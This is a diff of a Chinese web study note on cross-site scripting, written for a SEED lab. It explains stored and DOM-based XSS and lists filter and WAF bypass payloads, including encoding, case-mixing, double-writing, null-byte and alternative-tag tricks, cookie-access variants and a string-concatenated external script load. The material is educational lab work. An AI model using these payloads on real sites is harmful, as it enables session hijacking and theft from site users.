-      <div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a> 攻击者提交恶意脚本（留言，评论，用户名等地方）
+   特点：
+     恶意脚本存储到服务器中（数据库，文件等）
+     攻击持久化，影响所有访问用户
+     危害最大
+   攻击流程：
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a> 攻击者提交恶意脚本（留言，评论，用户名等地方）
 </span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>                   |
 </span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>    服务器将攻击者提交的内容存储到数据库 
 </span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>                   |
@@ -2424,18 +2517,18 @@
 </span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>                   |
 </span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>          访问者的浏览器解析执行
 </span></code></pre></div>
-      示例场景：
-         论坛评论
-         商品评价
-         用户昵称
-         聊天记录</li>
+   示例场景：
+      论坛评论
+      商品评价
+      用户昵称
+      聊天记录</li>
 <li>DOM型xss
-      特点：
-        漏洞在客户端的js代码中
-        不经过服务端，仅在前端处理
-        服务端的过滤无法防御
-      攻击流程：
-      <div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>      用户访问包含漏洞的页面
+   特点：
+     漏洞在客户端的js代码中
+     不经过服务端，仅在前端处理
+     服务端的过滤无法防御
+   攻击流程：
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>      用户访问包含漏洞的页面
 </span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>               |
 </span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>  前端JS读取url中的参数或用户输入
 </span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>               |
@@ -2443,39 +2536,47 @@
 </span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>               |
 </span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>         浏览器解析执行
 </span></code></pre></div>
-      示例：
-        前端代码
-        <div class="language-javascript highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
+   示例：
+     前端代码
+     <div class="language-javascript highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
 </span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;welcome&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
 </span></code></pre></div>
-        攻击者输入的恶意url
-        <code>https://example.com/#&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
-<li>过滤绕过手法</li>
+     攻击者输入的恶意url
+     <code>https://example.com/#&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+</ol>
+<h2 id="_2">过滤绕过手法<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ol>
 <li>过滤空格
-      绕过手法：
-        1. /替代<code>&lt;img/src=x/onerror=alert(1)&gt;</code>
-        2. Tab替代<code>&lt;img%09src=x%09onerror=alert(1)&gt;</code>
-        3. 换行符替代<code>&lt;img%0asrc=x%0aonerror=alert(1)&gt;</code> </li>
+   绕过手法：<ol>
+<li>/替代<code>&lt;img/src=x/onerror=alert(1)&gt;</code></li>
+<li>Tab替代<code>&lt;img%09src=x%09onerror=alert(1)&gt;</code></li>
+<li>换行符替代<code>&lt;img%0asrc=x%0aonerror=alert(1)&gt;</code> </li>
+</ol>
+</li>
 <li>过滤引号
-      绕过手法：
-        1. 不使用引号<code>&lt;img src=x onerror=alert(1)&gt;</code> 
-        2. 反引号替代引号<img src=x onerror=alert(\`a\`)></li>
+   绕过手法：<ol>
+<li>不使用引号<code>&lt;img src=x onerror=alert(1)&gt;</code> </li>
+<li>反引号替代引号<img src=x onerror=alert(\`a\`)></li>
+</ol>
+</li>
 <li>只过滤小写关键字
-      绕过手法：大小写绕过
-        1. <code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code>
-        2. <code>&lt;iMg onerror=alert(1) src=a&gt;</code>
-        3. <code>&lt;BODY ONLOAD=alert('XSS')&gt;</code></li>
+   绕过手法：大小写绕过<ol>
+<li><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></li>
+<li><code>&lt;iMg onerror=alert(1) src=a&gt;</code></li>
+<li><code>&lt;BODY ONLOAD=alert('XSS')&gt;</code></li>
+</ol>
+</li>
 <li>只过滤一次关键字
-      绕过手法：双写绕过 <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>
-  其他绕过手法：<ol>
+   绕过手法：双写绕过 <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>
+其他绕过手法：</li>
 <li>编码绕过<ol>
 <li>HTML实体编码【注意不能将标签的&lt;&gt;也编码了，这样会破坏标签结构使浏览器无法正确识别标签从而将代码当作文本输出而不是执行代码】
-     <code>&lt;img src=# onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></li>
+      <code>&lt;img src=# onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></li>
 <li>url编码【适用于 服务器或 WAF 对 URL 参数进行解码后直接输出到页面 的场景】
-    <code>%3Cscript%3Ealert(1)%3Cscript%3E</code>
-    <code>%27%3E%3Cscript%3Ealert(1)%3C/script%3E</code></li>
+     <code>%3Cscript%3Ealert(1)%3Cscript%3E</code>
+     <code>%27%3E%3Cscript%3Ealert(1)%3C/script%3E</code></li>
 <li>JavaScript Unicode 编码
-   绕过的关键：当waf看到\u0061\u006c...，这些字符并不直接构成它规则中的alert，于是放行。而浏览器解析这段代码时会先执行unicode解码，还原为原始的字符alert之后再执行js代码 <ol>
+    绕过的关键：当waf看到\u0061\u006c...，这些字符并不直接构成它规则中的alert，于是放行。而浏览器解析这段代码时会先执行unicode解码，还原为原始的字符alert之后再执行js代码 <ol>
 <li><code>&lt;script&gt;a\u006cert(1)&lt;/script&gt;</code></li>
 <li><code>&lt;img src=# onerror=\u0061\u006C\u0065\u0072\u0074('xss')&gt;</code>【需要特别注意的是，括号和引号是JavaScript语法的核心组成部分，对它们进行编码很可能破坏语法结构，导致代码执行失败。实战中，这需要对目标JavaScript解析器的行为进行非常精细的测试。】</li>
 </ol>
@@ -2484,12 +2585,12 @@
 </li>
 <li>特殊字符绕过<ol>
 <li>NULL字节插入
-    <div class="language-javascript highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="o">%</span><span class="mo">00</span><span class="s2">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; //攻击者输入%00&quot;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;，目标是提前闭合value属性。 WAF绕过：WAF可能会检查&quot;&gt;这个危险的字符序列。但如果它将%00视为无害字符，或者在对%00解码后没有继续深入分析，就可能无法识别出%00&quot;&gt;这个组合的恶意意图。</span>
+     <div class="language-javascript highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="o">%</span><span class="mo">00</span><span class="s2">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; //攻击者输入%00&quot;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;，目标是提前闭合value属性。 WAF绕过：WAF可能会检查&quot;&gt;这个危险的字符序列。但如果它将%00视为无害字符，或者在对%00解码后没有继续深入分析，就可能无法识别出%00&quot;&gt;这个组合的恶意意图。</span>
 </span></code></pre></div></li>
 <li>异常语法分隔
-    <div class="language-javascript highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="s1">&#39;alert(1)&#39;</span><span class="nx">src</span><span class="o">=</span><span class="nx">a</span><span class="o">&gt;</span>
+     <div class="language-javascript highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="s1">&#39;alert(1)&#39;</span><span class="nx">src</span><span class="o">=</span><span class="nx">a</span><span class="o">&gt;</span>
 </span></code></pre></div>
-    onerror='alert(1)'src=a 中，'和src之间没有空格。在某些WAF看来，onerror='alert(1)'后面应该跟一个空格才能解析出下一个属性，没有空格可能导致WAF解析失败，从而放行。浏览器解析器的容错性远高于WAF。即使属性和属性之间没有空格，它也能正确识别出onerror和src是两个不同的属性。它会将'alert(1)'作为onerror的值，src=a作为下一个属性。</li>
+     onerror='alert(1)'src=a 中，'和src之间没有空格。在某些WAF看来，onerror='alert(1)'后面应该跟一个空格才能解析出下一个属性，没有空格可能导致WAF解析失败，从而放行。浏览器解析器的容错性远高于WAF。即使属性和属性之间没有空格，它也能正确识别出onerror和src是两个不同的属性。它会将'alert(1)'作为onerror的值，src=a作为下一个属性。</li>
 </ol>
 </li>
 <li>标签与事件处理器绕过（当<code>&lt;script&gt;</code>标签被过滤时可使用其他标签）<ol>
@@ -2505,10 +2606,10 @@
 </li>
 <li>JavaScript层面绕过<ol>
 <li>替代点操作符
-    <code>alert(document[cookie])</code> 
-    <code>with(cookie)alert(dociment)</code></li>
+     <code>alert(document[cookie])</code> 
+     <code>with(cookie)alert(dociment)</code></li>
 <li>字符串拼接绕过长度限制：
-    <div class="language-javascript highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+     <div class="language-javascript highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
 </span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nx">z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;script src=&#39;</span><span class="p">;</span>
 </span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="nx">z</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s1">&#39;test.c&#39;</span><span class="p">;</span>
 </span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="nx">z</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s1">&#39;n/1.js&gt;&lt;/script&gt;&#39;</span><span class="p">;</span>
@@ -2518,12 +2619,8 @@
 </ol>
 </li>
 </ol>
-</li>
-<li>xss攻击的危害</li>
-<li>用户层面危害</li>
-<li>企业层面危害</li>
-</ol>
-<h3 id="_3">实验环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h2 id="_3">实验部分<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">实验环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <ol>
 <li>DNS配置
    在/etc/hosts添加本实验需要访问的网站域名的ip域名映射规则<img alt="" src="../xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/2026-04-15-13-53-13.png" /></li>
@@ -2554,7 +2651,7 @@
       本实验中提供的一些账号的用户名密码
         <img alt="" src="../xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/2026-04-15-15-03-31.png" /></li>
 </ol>
-<h3 id="_4">基础实验任务（进阶式）<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<h3 id="_5">基础实验任务（进阶式）<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <ol>
 <li>任务一：发布恶意消息以显示警告窗口</li>
 <li>访问<code>http://www.seed-server.com/</code>进入登录界面<img alt="" src="../xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/2026-04-15-15-40-44.png" /></li>
@@ -2877,7 +2974,7 @@
 </ol>
 </li>
 </ol>
-<h2 id="_5">工具使用<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h3 id="_6">工具使用<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
 <ol>
 <li>HTTP Header Live</li>
 <li>Web开发者工具</li>
@@ -2909,7 +3006,7 @@
 </ol>
 </li>
 </ol>
-<h2 id="_6">实验总结<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<h3 id="_7">实验总结<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
 <ol>
 <li>踩坑</li>
 <li>虚拟机与docker之间的网络连接出了问题<ol>
@@ -3331,7 +3428,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="May 31, 2026 07:14:28 UTC"><span class="timeago" datetime="2026-05-31T07:14:28+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="May 31, 2026 07:14:28 UTC">2026-05-31</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="June 7, 2026 19:11:15 UTC"><span class="timeago" datetime="2026-06-07T19:11:15+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="June 7, 2026 19:11:15 UTC">2026-06-07</span>
   </span>
 
     
@@ -3341,7 +3438,7 @@
     <span class="md-icon" title="Created">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="May 31, 2026 07:14:28 UTC"><span class="timeago" datetime="2026-05-31T07:14:28+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="May 31, 2026 07:14:28 UTC">2026-05-31</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="June 7, 2026 19:11:15 UTC"><span class="timeago" datetime="2026-06-07T19:11:15+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="June 7, 2026 19:11:15 UTC">2026-06-07</span>
   </span>
 
     
